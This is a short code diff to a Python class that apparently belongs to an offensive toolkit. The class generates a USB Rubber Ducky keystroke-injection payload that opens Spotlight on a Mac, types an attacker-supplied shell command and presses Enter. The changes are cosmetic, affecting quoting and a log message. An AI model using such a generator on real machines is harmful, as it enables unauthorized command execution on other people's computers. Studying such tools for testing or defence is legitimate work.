@@ -45,7 +45,7 @@ class payload:
 		if os.path.exists("payloads/rubber_duck") == False:
 			os.mkdir("payloads/rubber_duck")
 		payload_save_path = "payloads/rubber_duck/payload.txt"
-		payload = """\
+		payload = """
 DELAY 500
 COMMAND SPACE
 DELAY 500
@@ -56,10 +56,8 @@ DELAY 500
 STRING """+shell_command+"""
 DELAY 500
 ENTER
-DELAY 500
-"""
+DELAY 500"""
 		f = open(payload_save_path,"w")
 		f.write(payload)
 		f.close()
-		h.info_general("Payload saved to " + payload_save_path)
-
+		h.info_success("Payload saved to " + payload_save_path + "!")
